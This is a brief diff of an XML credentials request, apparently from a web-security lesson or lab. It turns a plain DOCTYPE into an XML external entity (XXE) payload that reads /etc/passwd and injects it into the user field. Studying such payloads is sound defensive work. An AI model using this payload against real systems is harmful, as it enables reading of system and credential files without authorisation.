@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY <b>xxe</b> SYSTEM <b>"file:///etc/passwd</b>" >]>
 <creds>
-    <user><b>awdawd</b></user>
+    <user><b>&xxe;</b></user>
     <pass>mypass</pass>
 </creds>
